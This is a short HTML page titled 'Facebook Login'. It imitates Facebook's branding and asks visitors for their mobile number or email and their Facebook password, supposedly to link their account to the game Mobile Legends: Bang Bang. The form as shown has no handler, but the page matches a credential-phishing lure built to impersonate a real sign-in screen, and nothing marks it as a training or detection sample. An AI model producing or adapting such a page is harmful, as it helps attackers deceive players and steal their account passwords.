<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="facebook-bar">
                <span>facebook</span>
            </div>
        </header>

        <main class="login-section">
            <img src="mlbb-icon.png" alt="Mobile Legends Icon" class="game-icon">
            <h2>Log in to your Facebook account to connect to Mobile Legends: Bang Bang</h2>
            <form class="login-form">
                <input type="text" placeholder="Mobile number or email address" required>
                <input type="password" placeholder="Facebook password" required>
                <button type="submit">Log in</button>
            </form>
            <a href="#" class="forgot-password">Forgotten password?</a>
            <a href="#" class="create-account">Create account</a>
        </main>
    </div>
</body>
</html>
